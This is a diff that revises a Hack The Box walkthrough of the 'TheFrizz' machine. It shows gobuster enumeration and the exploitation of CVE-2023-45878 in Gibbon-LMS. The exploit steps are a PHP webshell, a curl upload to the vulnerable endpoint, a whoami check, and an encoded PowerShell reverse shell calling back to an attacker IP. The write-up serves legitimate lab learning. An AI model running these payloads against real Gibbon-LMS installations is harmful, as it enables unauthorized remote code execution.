@@ -55,72 +55,61 @@ Nmap shows message signing enabled and required. `nxc` confirms SMBv1 is disable
 
 ## Web Enumeration (Port 80)
 ### Initial Access to the Web App
-Browising to port 80 presents a public “Walker­ville Elementary School” site with a Staff Login link, which led to a Gibbon-LMS instance.
+Browsing to port 80 presents a public “Walkerville Elementary School” site. The Staff Login link redirects to a Gibbon-LMS instance hosted on the same server.
 ![](assets/img/htb/thefrizz/thefrizz6.png)
 ![](assets/img/htb/thefrizz/thefrizz7.png)
 
 ---
 
 ### Directory Brute Force
-Ran `gobuster` against the Gibbon-LMS application for anything interesting.
+Ran gobuster against the Gibbon-LMS directory to identify hidden endpoints or misconfigurations.
+No additional interesting directories or files were discovered. Enumeration shifts to application-level vulnerabilities.
+
+`gobuster dir -u http://frizzdc.frizz.htb/Gibbon-LMS -w /home/user/tools/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php`
 ![](assets/img/htb/thefrizz/thefrizz8.png)
 
 ---
 
-## Initial Access (Web → Shell)
-
+## Initial Access (Web → RCE)
 ### CVE-2023-45878 — Gibbon-LMS Arbitrary File Write  
-
-#### Payload
-
-I created a minimal PHP webshell:
+The Gibbon-LMS instance is vulnerable to CVE-2023-45878, allowing arbitrary file write via a base64 image upload endpoint.
+Minimal PHP webshell:
 
 `echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php`
 
-Because the endpoint expects base64 data, I encoded the file:
+The endpoint expects base64-encoded data, so the file is encoded:
 
 `b64=$(base64 -w0 shell.php)`
 ![](assets/img/htb/thefrizz/thefrizz12.png)
 
-#### Upload the webshell
-
-I then abused the vulnerable endpoint to write the file to the server. gibbonPersonID is needed.
+The vulnerable endpoint allows writing arbitrary content to disk.
 
 `curl -s -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" -d "img=image/png;asdf,${b64}" -d "path=shell.php" -d "gibbonPersonID=0000000001"`
 ![](assets/img/htb/thefrizz/thefrizz14.png)
 
-What each parameter does:
-
-`img=image/png;asdf,${b64}`  
-  The server splits on the comma, base64-decodes everything on the right, and writes it to disk.  
-  The `image/png;asdf` portion is just filler to satisfy the parser.
-  
-`path=shell.php`  
-  Controls the output filename. Because extensions are not restricted, I can choose `.php`.
-  
-`gibbonPersonID=0000000001`  
-  A required application field that influences where the file is saved.
-
-If the upload succeeds, the endpoint echoes the filename back:
-
+Parameter breakdown:
+* `img=image/png;asdf,${b64}`
+    The server splits on the comma and base64-decodes the right side, writing it to disk.
+* `path=shell.php`
+    Controls the output filename. No extension restriction allows `.php`.
+* `gibbonPersonID=0000000001`
+    Required application field influencing save location.
+Successful upload returns the filename:
 `shell.php%`
 
-#### Verify remote code execution
-
-I accessed the uploaded shell directly:
-
+Verify remote code execution
+Access the shell directly:
 `curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=whoami"`
 ![](assets/img/htb/thefrizz/thefrizz13.png)
 `frizz\w.webservice`
-
 This confirms remote command execution on the web server.
 
-I then used a revshell powershell oneliner.
+A PowerShell reverse shell payload is delivered via the webshell:
 
 `curl -s -G "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php" --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
 ![](assets/img/htb/thefrizz/thefrizz16.png)
 
-This results in a shell as w.webservice
+This results in an interactive shell as `w.webservice`
 ![](assets/img/htb/thefrizz/thefrizz17.png)
 
 ## Shell as f.frizzle
